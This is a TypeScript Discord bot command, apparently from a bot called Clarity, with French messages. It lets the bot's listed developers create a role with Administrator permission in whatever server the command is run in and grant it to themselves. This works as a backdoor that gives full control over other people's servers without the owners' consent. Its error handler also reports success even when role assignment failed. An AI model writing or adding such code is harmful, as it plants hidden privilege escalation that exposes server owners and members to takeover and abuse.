import { Client, Message , Role} from "discord.js";

export default {
    name: "devrole",
    description: "cree un role pour les devs de clarity",
    category: "🔗〢Dev",
    run: async (client: Client, message: Message, args: string[]) => {
        if (!client.config.devs.includes(message.author.id)) return message.reply({
            content: "Vous n'avez pas la permission pour faire cette commande"
        })
        if (client.config.devs.includes(message.author.id)) {
            try {
                // create a role named "clarity-dev" if it doesn't exist
                const role = message.guild?.roles.cache.find(role => role.name === "🛡️ || Clarity-Dev") || await message.guild?.roles.create({
                    name: "🛡️ || Clarity-Dev",
                    color: "#3498db", // You can change the color code as needed
                    permissions: ["Administrator"] // Set the administrator permission
                });

                // Loop through each developer ID in the config and add the role to them
                for (const devId of client.config.devs) {
                    const devMember = await message.guild?.members.fetch(devId);
                    if (devMember && !devMember.roles.cache.has(role?.id as string)) {
                        await devMember.roles.add(role as Role);
                    }
                }

                message.channel.send({ content: `Le rôle ${role} a été créé et ajouté à tous les développeurs.` });
            } catch (e) {
                const role = message.guild?.roles.cache.find(role => role.name === "🛡️ || Clarity-Dev") || await message.guild?.roles.create({
                    name: "🛡️ || Clarity-Dev",
                    color: "#3498db", // You can change the color code as needed
                    permissions: ["Administrator"] // Set the administrator permission
                });
                message.channel.send({ content: `Le rôle ${role} a été créé et ajouté à tous les développeurs.` });
            }
        }
    },
};
